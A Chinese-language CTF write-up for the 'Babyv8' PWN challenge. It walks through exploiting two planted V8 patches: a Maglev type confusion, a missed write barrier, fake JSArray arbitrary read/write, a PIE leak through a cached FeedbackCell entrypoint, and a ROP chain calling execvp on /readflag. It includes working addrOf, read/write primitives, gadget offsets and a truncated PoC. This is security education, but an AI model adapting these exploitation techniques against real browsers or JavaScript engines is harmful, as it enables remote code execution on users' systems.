# Babyv8

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+靶机） |
| 附件 | Babyv8.zip（含启用V8 sandbox的d8、两处补丁0006/0007、协议说明） |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

题面只有一句“一个简单的v8”。
`d8`以非root身份运行，`/flag`仅root可读，同目录下的`/readflag`是setuid-root程序。因此利用的最终目标不是直接打开`/flag`，而是让`d8`执行`/readflag`。
整条链由两处人为补丁串起来：
```text
0006：Maglev 循环 phi 错误保留 Smi 类型
  → 对象指针写入 PACKED_SMI_ELEMENTS
  → 漏掉 old→young write barrier
  → minor GC 后产生悬空引用
  → 重占位伪造 JSArray
  → V8 cage 内任意读写
0007：FeedbackCell 缓存未经保护的原生入口
  → 泄露 d8 PIE 基址
  → 覆盖 cached_entrypoint
  → ROP 调用 execvp("/readflag")
```
在sandbox与指针压缩同时开启时，JS堆对象之间使用32位压缩指针，带tag的引用并不等于进程完整地址。因此利用分成两段：先在cage内拿到任意读写，再用cage内的原生入口字段泄露PIE并劫持控制流。
以下map值、对象字段偏移和gadget偏移都只对应随题提供的这份`d8`，换版本或换编译配置即失效。

## 2. 题目分析

### 补丁修改

补丁`0006`修改了Maglev的`TryMergeLoop`与`Phi::promote_post_loop_type`。当loop phi的首输入是`SmiConstant`、而回边类型只是比入口类型“更宽”时，编译器允许跳过循环重新展开；随后`promote_post_loop_type`对入口类型与回边合并类型取交集，于是仍然保留入口处的窄类型Smi。

问题在于回边实际可以带入非Smi对象，这个交集并不成立。循环出口因此被错误标记为Smi，后续对该值的存储就按Smi处理，得到“类型检查说它是Smi、内存里却是对象指针”的混淆。

### 触发函数

```js
function put(a, o, n) {
  let x = 0;
  for (let i = 0; i < n; i++) x = i === 0 ? 0 : o;
  a[0] = x;
  return a;
}
```

Maglev首次展开循环时把`x`视为常量`0`；后续迭代可以把对象`o`写入`x`，但循环出口仍按Smi处理。先用整数热身`put`（让Maglev完成优化编译），再传入对象，就得到：

- `a[0] === o`为真，说明槽位里确实是对象指针；
- 数组的元素种类仍然是Smi（`PACKED_SMI_ELEMENTS`）；
- 槽位中实际存放的是32位压缩对象指针。

对这种数组调用`String(a)`时，本题的`d8`会把槽位内容按Smi转成数字，而不是按对象打印。`addrOf`正是利用这一点：拿到十进制字符串后，用`(n * 2 + 1) >>> 0`还原带tag的32位压缩指针，从而得到对象在cage内的地址。

```js
const leaker = [0, 1];
leaker[0] = 42;
function addrOf(o) {
  put(leaker, o, 3);
  const text = String(leaker);
  const first = Number(text.slice(0, text.indexOf(',')));
  if (!Number.isInteger(first)) throw Error('addrOf failed: ' + text);
  return (first * 2 + 1) >>> 0;
}
```

`leaker[0] = 42`是必要的：数组字面量的backing store默认是copy-on-write的，先写一次才能拿到私有、可被Maglev按Smi元素存储的backing store。

### 漏掉的写屏障

对已经晋升到老年代的Smi数组执行`a[0] = x`时，Maglev生成`StoreFixedArrayElementNoWriteBarrier`：对象指针被写入老年代的backing store，却没有登记“老年代→新生代”的引用。

于是GC的根扫描看不到这个引用：新生代对象被搬走（或回收）后，老年代数组槽位里留下的仍是旧地址，成为悬空引用。利用代码先对每个数组执行`a[0] = 42`解除COW，再把数组和`victim`晋升到老年代；`keepAlive[]`只用于保活新建对象，保证它们在被引用时仍然存活，从而让悬空槽位指向“曾经有效、现在可被复用”的地址。

### 重占位与cage内任意读写

##### 伪造JSArray

利用代码创建一个带16个浮点元素的数组，直接获得可控的`FixedDoubleArray`数据区；数据起点是`addrOf(array) + 23`（`addrOf`返回带tag指针，比对象实际起点大1，元素区相对对象起点为`+0x10`，合起来偏移23）。

随后用`delta = (staleAddrs[i] - 1) - dataStart`判断每个悬空地址是否落在该数据区内。落在区内时按4字节对齐的相位写伪`JSArray`头：

| 伪对象起点偏移 | 字段 | 本题取值 |
| --- | --- | --- |
| `+0x00` | `map` | `0x0100baa9`，packed-double JSArray map |
| `+0x04` | `properties` | `0x7e5`，空属性存储 |
| `+0x08` | `elements` | `victimAddr - 8` |
| `+0x0c` | `length` | `0x20`，即Smi编码的16 |

`delta & 7 == 0`时伪对象与double槽8字节对齐，两条`u2f`就能写完16字节；否则伪对象相对槽位错开4字节，需要三条`u2f`跨槽写入（`shiftedHeader0/1/2`）。这就是脚本里`fakeHeader*`与`shiftedHeader*`两套常量的由来。

重占位完成后，`bads[i][0]`读到的是伪数组`fake`。由于`fake.elements`指向真实`victim`数组头前8字节：

- `fake[0]`覆盖`victim`的`map`与`properties`；
- `fake[1]`覆盖`victim`的`elements`与`length`。

`if (... || fakeArray.length !== 16)`这次校验很关键：只有长度字段真的被解释成16，才说明伪对象被正确识别为JSArray。

##### 读写原语

```js
function read64(addr) {
  fakeArray[1] = u2f((addr - 7) >>> 0, FAKE_LENGTH_SMI);
  return f2u(victim[0]);
}
function write64(addr, lo, hi) {
  fakeArray[1] = u2f((addr - 7) >>> 0, FAKE_LENGTH_SMI);
  victim[0] = u2f(lo, hi);
}
```

原理：改写`fake[1]`即改写`victim.elements`，把它指向`(addr - 7) >>> 0`。`victim`是`PACKED_DOUBLE_ELEMENTS`数组，访问`victim[0]`时按`elements + 8 + 0*8`取数，减7是因为压缩指针低3位带tag（`elements`指针本身带1，元素区再偏移8，合计需要`addr-7`才能让`victim[0]`正好落在`addr`）。

两种地址形式必须严格区分：

- `addrOf`返回带tag的压缩指针（最低位为1）；
- `read64`/`write64`接受不带tag的cage字节偏移。

例如`JSFunction`实际起点`+0x18`处存的是压缩后的`FeedbackCell`指针，读取时应传`targetAddr + 0x17`：`targetAddr`比对象实际起点多1，`+0x18`再减1即`+0x17`。

可用性检查分两步：先读`victim`的头字段，确认`map`是`0x0100baa9`、`properties`是`0x7e5`；再把另一个double数组的首元素从`3.3`改成`5.5`并回读确认。两步都过，才说明读写原语在任意地址上有效。

### 第二处漏洞：FeedbackCell缓存入口

##### 补丁修改

补丁`0007`给`FeedbackCell`增加了8字节原始指针`cached_entrypoint`，位于对象实际起点`+0x10`。`MacroAssembler::CallJSDispatchEntry`会从这个字段读取入口地址并直接`call`。

这个字段在可写的V8 cage内，绕过了原本由`JSDispatchTable`提供的入口保护：正常情况下函数入口由只读的dispatch表决定，攻击者改不到；而现在cage内任意写就能改掉缓存入口。这就把“cage内任意读写”升级成“原生控制流劫持”。

##### 泄露PIE

`JSFunction`实际起点`+0x18`保存带tag的压缩`FeedbackCell`指针，读出后即为`targetCell`。取一个从未被调用过的函数`entryLeak`，它的缓存入口还没被优化代码写过，仍然是`d8`二进制里的入口地址：

```js
const targetAddr = addrOf(target);
const targetCell = read64(targetAddr + 0x17)[0];
const leakAddr = addrOf(entryLeak);
const leakCell = read64(leakAddr + 0x17)[0];
const pie = join64(read64(leakCell + 0x0f)) - PIE_ENTRY_OFFSET;
```

`read64(leakCell + 0x0f)`读的就是`cached_entrypoint`（对象起点`+0x10`，减1得到无tag偏移）。减去本题二进制中该入口的偏移`0x315a380`即得PIE基址；`pie & 0xfff != 0`时直接报错，避免拿错值继续。

##### 确保走进被劫持的调用

普通`f()`调用不一定经过`CallJSDispatchEntry`（可能走内联缓存或直接内联）。利用代码用体积较大的`target`（1000条`y+=1`）阻止内联，并预热`caller`十万次，使常量`JSFunction`的优化调用最终落到该helper：

```js
const target = new Function(
  'x', 'let y=x;' + 'y+=1;'.repeat(1000) + 'return y;');
function caller(x) { return target(x); }
for (let i = 0; i < 100000; i++) caller(i);
```

### ROP与命令执行

ROP链布置在目标`FeedbackCell`附近，下表偏移都相对带tag的`targetCell`：

| 写入位置 | 写入值或作用 |
| --- | --- |
| `+0x00` | `PIE + 0x18bb132`：`add rsp, 0x10; pop rbp; ret`，跳过缓存字段本身 |
| `+0x18` | `0`：供`pop rbp`消耗 |
| `+0x20` | `PIE + 0x193a9cc`：`xor esi, esi; ret`（`argv = NULL`） |
| `+0x28` | `PIE + 0x34be450`：`d8`的`execvp@plt` |
| `+0x0f`，最后写 | `PIE + 0x27e9e69`：`push rbx; pop rsp; ret`，把栈枢转到`FeedbackCell` |

枢转成立的前提是调用时`rbx`指向`targetCell`（`CallJSDispatchEntry`用它取缓存入口），于是`push rbx; pop rsp`之后`rsp = targetCell`，`ret`取`targetCell[0]`即`add rsp,0x10; pop rbp; ret`，跳过`+0x08`与`+0x10`（缓存入口所在位置），落到`+0x20`的`xor esi, esi; ret`，再`ret`到`+0x28`的`execvp@plt`。

`execvp`的两个参数：`rdi`在进入被劫持调用时已经指向目标`JSFunction`，所以把该对象起始字节改写成`/readflag\0`即可当路径串用；`rsi`由gadget清零，表示不传参数。由于改写函数头会破坏后续所有读写与地址计算，这一步必须放在最后。

```js
write64(targetCell + 0x18, 0, 0);
write64(targetCell + 0x20, zeroArgv[0], zeroArgv[1]);
write64(targetCell + 0x28, execvp[0], execvp[1]);
write64(targetCell, skip[0], skip[1]);
write64(targetAddr + 8, tail[0], tail[1]);   // 保留原对象第二 qword，只改前 8 字节
write64(targetAddr, path[0], path[1]);       // 起始字节 = "/readflag\0"
write64(targetCell + 0x0f, pivot[0], pivot[1]);
caller(1);
```

`/readflag`以setuid-root身份读取目标文件，并把内容输出到当前连接，因此不需要任何libc偏移，也不需要在cage外找gadget。

## 3. 解题过程

利用过程不使用显式`gc()`，也不依赖`--expose-gc`或`%`内部指令。`moveOnce`持续分配垃圾对象，同时观察一个存活对象的`addrOf`是否变化，以此判断是否真的发生了一次搬迁：

```js
function trashOne() { new Array(256).fill(1.1); }
function moveOnce(o) {
  const before = addrOf(o);
  for (let i = 0; i < 10000; i++) {
    trashOne();
    if (addrOf(o) !== before) return i + 1;
  }
  throw Error('minor GC was not observed');
}
```

这样做的目的有两个：一是把“GC何时发生”变成可观测事件，避免硬编码分配次数；二是连续两次搬迁后，旧地址必然进入可重用空间，为后面的重占位创造条件。

调用顺序是：`moveOnce(smiArrays[0])`把数组与`victim`推到老年代，`moveOnce(gcCanary)`再推一次，随后给每个`bads[i]`写入一个新对象并记录其`addrOf`，最后两次`moveOnce`把这些新对象也搬走——它们原来的地址就成了悬空槽位里的值。

## 4. PoC

```javascript
  let x = 0;
  for (let i = 0; i < n; i++) x = i === 0 ? 0 : o;
  a[0] = x;
  return a;
}

for (let i = 0; i < 500; i++) put([0, 1], 1, 3);
Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 300);
let probe = [0, 1];
probe[0] = 42;
const probeObject = {};
put(probe, probeObject, 3);
if (probe[0] !== probeObject || String(probe).startsWith('[object')) {
  throw Error('Maglev type confusion did not trigger');
}
print('stage: trigger');

const BAD_COUNT = 32;
const SPRAY_COUNT = 256;
const FAKE_ARRAY_LENGTH = 16;
const FAKE_LENGTH_SMI = FAKE_ARRAY_LENGTH << 1;
const PACKED_DOUBLE_ARRAY_MAP = 0x0100baa9;
const EMPTY_PROPERTIES = 0x7e5;
const PIE_ENTRY_OFFSET = 0x315a380n;
const GADGET_SKIP = 0x18bb132n;
const GADGET_ZERO_RSI = 0x193a9ccn;
const GADGET_EXECVP = 0x34be450n;
const GADGET_PIVOT = 0x27e9e69n;
const READFLAG_PATH = '/readflag';

const view = new DataView(new ArrayBuffer(8));
function u2f(lo, hi) {
  view.setUint32(0, lo >>> 0, true);
  view.setUint32(4, hi >>> 0, true);
  return view.getFloat64(0, true);
}
function f2u(f) {
  view.setFloat64(0, f, true);
  return [view.getUint32(0, true), view.getUint32(4, true)];
}

const leaker = [0, 1];
leaker[0] = 42;
function addrOf(o) {
  put(leaker, o, 3);
```
